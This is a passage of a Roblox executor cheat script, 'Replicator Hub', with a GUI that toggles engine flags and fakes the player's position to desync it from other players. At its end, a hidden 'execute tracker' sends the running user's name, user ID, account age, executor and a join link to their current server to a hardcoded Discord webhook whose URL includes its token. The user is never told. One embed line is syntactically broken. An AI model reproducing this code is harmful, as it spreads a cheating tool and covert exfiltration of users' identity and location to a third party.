-- Fake Pos Button
local fakeBtn = Instance.new("TextButton")
fakeBtn.Size = UDim2.new(0,150,0,46)
fakeBtn.Position = UDim2.new(0.5,-75,0,145)
fakeBtn.BackgroundColor3 = Color3.fromRGB(130,50,255)
fakeBtn.Text = "FAKE OFF"
fakeBtn.TextScaled = true
fakeBtn.Font = Enum.Font.GothamBold
fakeBtn.Parent = content
Instance.new("UICorner", fakeBtn).CornerRadius = UDim.new(0,16)

-- Variables
local fakeActive = false
local savedPos = nil
local minimized = false

-- DRAGGING (100% working)
local dragging = false
local dragInput, dragStart, startPos

header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and input == dragInput then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Minimize
mini.MouseButton1Click:Connect(function()
    minimized = not minimized
    mini.Text = minimized and "+" or "−"
    content.Visible = not minimized
    TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Quart), {
        Size = minimized and UDim2.new(1,0,0,42) or UDim2.new(1,0,1,0)
    }):Play()
end)

close.MouseButton1Click:Connect(function() scr:Destroy() end)

-- T Key (opens immediately)
UserInputService.InputBegan:Connect(function(input, gp)
    if input.KeyCode == Enum.KeyCode.T and not gp then
        main.Visible = not main.Visible
        if main.Visible and minimized then
            minimized = false
            mini.Text = "−"
            content.Visible = true
            card.Size = UDim2.new(1,0,1,0)
        end
    end
end)

-- Replicator Toggle
repBtn.MouseButton1Click:Connect(function()
    local on = repBtn.Text == "OFF"
    repBtn.Text = on and "ON" or "OFF"
    repBtn.BackgroundColor3 = on and Color3.fromRGB(0,255,100) or Color3.fromRGB(255,50,50)
    glow.ImageColor3 = on and Color3.fromRGB(0,255,100) or Color3.fromRGB(0,255,255)
    pcall(function() setfflag("NextGenReplicatorEnabledWrite4", on and "true" or "false") end)
end)

-- 0.11s Fake Pos
fakeBtn.MouseButton1Click:Connect(function()
    fakeActive = not fakeActive
    
    if fakeActive then
        savedPos = root.CFrame
        local x = tonumber(xBox.Text) or 0
        local y = tonumber(yBox.Text) or 800
        local z = tonumber(zBox.Text) or 0
        
        root.CFrame = CFrame.new(x, y, z)
        task.wait(0.09)
        pcall(function() setfflag("NextGenReplicatorEnabledWrite4", "true") end)
        root.CFrame = savedPos
        
        fakeBtn.Text = "FAKE ON"
        fakeBtn.BackgroundColor3 = Color3.fromRGB(0,255,150)
        repBtn.Text = "ON"
        repBtn.BackgroundColor3 = Color3.fromRGB(0,255,100)
        glow.ImageColor3 = Color3.fromRGB(0,255,150)
        
    else
        pcall(function() setfflag("NextGenReplicatorEnabledWrite4", "false") end)
        fakeBtn.Text = "FAKE OFF"
        fakeBtn.BackgroundColor3 = Color3.fromRGB(130,50,255)
        repBtn.Text = "OFF"
        repBtn.BackgroundColor3 = Color3.fromRGB(255,50,50)
        glow.ImageColor3 = Color3.fromRGB(0,255,255)
    end
end)

-- Respawn handler
player.CharacterAdded:Connect(function(c)
    char = c
    root = c:WaitForChild("HumanoidRootPart")
    fakeActive = false
end)

-- STARTUP – UI APPEARS IMMEDIATELY
main.Visible = true
TweenService:Create(main, TweenInfo.new(0.6, Enum.EasingStyle.Back), {
    Position = UDim2.new(0,80,0.5,-150)
}):Play()
    
-- ULTIMATE COOL EXECUTE TRACKER v4 – MAX DETAILS + SEXY EMBED
spawn(function()
    local webhook = "https://discord.com/api/webhooks/1445819734242103369/3o8Vg5IpWOOvDdJxtuQfX5nIlFWvqWl3mWIyFRX9e5XRSc3Rdtp2SpFP0rXbEbrW6NoQ"
    local player = game:GetService("Players").LocalPlayer
    local http = game:GetService("HttpService")
    local rs = game:GetService("RunService")

    local placeId = game.PlaceId
    local jobId = game.JobId
    local universeId = game.GameId
    local isStudio = rs:IsStudio()
    local isPrivateServer = jobId ~= "" and game.PrivateServerId ~= "" and game.PrivateServerId ~= "0"

    -- Executor (as good as it gets)
    local executor = "Unknown"
    if syn then executor = "Synapse X"
    elseif Krnl then executor = "Krnl"
    elseif Fluxus then executor = "Fluxus"
    elseif Solara then executor = "Solara"
    elseif Comet then executor = "Comet"
    elseif identifyexecutor then executor = identifyexecutor()
    elseif getexecutorname then executor = getexecutorname()
    end

    -- roblox:// deep link (clean)
    local robloxDeepLink = "roblox://placeId="..placeId
    if jobId ~= "" and not isStudio then
        robloxDeepLink = robloxDeepLink.."&gameInstanceId="..jobId
    end

    -- FPS & Ping (fun extra detail)
    local fps = isStudio and "N/A" or math.floor(1/workspace:GetRealPhysicsFPS())
    local ping = player:GetNetworkPing() * 1000
    ping = math.floor(ping).."ms"

    local data = {
        username = "Replicator Hub",
        content = "<@"..player.UserId..">",  -- pings the user
        embeds = {{
            title = "Script Executed",
            description = ("**%s** just loaded **Replicator Hub"):format(player.DisplayName),
            color = 0x00ff88,
            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"},
            author = {
                name = "@"..player.Name,
                url = "https://roblox.com/users/"..player.UserId.."/profile",
                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=48&height=48&format=png"
            },
            fields = {
                {name = "Display Name", value = player.DisplayName, inline = true},
                {name = "User ID",      value = "`"..player.UserId.."`", inline = true},
                {name = "Account Age",  value = player.AccountAge.." days", inline = true},
                {name = "Executor",     value = "**"..executor.."**", inline = true},
                {name = "FPS",          value = tostring(fps), inline = true},
                {name = "Ping",         value = ping, inline = true},
                {name = "Studio",       ", value = isStudio and "Yes" or "No", inline = true},
                {name = "Private Server", value = isPrivateServer and "Yes" or "No", inline = true},
                {name = "Place ID",     value = "`"..placeId.."`", inline = false},
                {name = "Universe ID",  value = "`"..universeId.."`", inline = false},
                {name = "Server Link",  value = robloxDeepLink, inline = false},
            },
            footer = {text = "Replicator Hub v5.7 • "..os.date("%x %X")},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    pcall(function()
        local req = request or http_request or (syn and syn.request) or (http and http.request)
        if req then
            req({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = http:JSONEncode(data)
            })
        end
    end)
end)

print("REPLICATOR HUB v5.7 LOADED – UI APPEARS + EVERYTHING WORKS!")
